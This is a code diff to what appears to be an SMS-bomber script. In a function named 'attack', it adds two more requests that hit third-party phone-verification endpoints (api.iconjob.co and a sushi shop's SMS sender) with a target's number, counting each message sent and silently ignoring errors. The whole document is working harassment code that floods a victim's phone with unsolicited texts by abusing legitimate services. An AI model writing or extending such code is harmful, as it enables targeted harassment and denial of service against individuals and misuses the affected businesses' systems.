@@ -263,3 +263,19 @@ def attack(number, sms):
             check(sent, sms)
         except:
             pass
+        
+        try:
+            requests.post('https://api.iconjob.co/api/auth/verification_code', json={"phone": number_7}, headers=HEADERS)
+            sent += 1
+            time(sent)
+            check(sent, sms)
+        except:
+            pass
+
+        try:
+            requests.post("https://sushifuji.ru/sms_send_ajax_sms.php", data={"phone_sms": number_7, "confirm_repeat": "0"}, headers=HEADERS)
+            sent += 1
+            time(sent)
+            check(sent, sms)
+        except:
+            pass
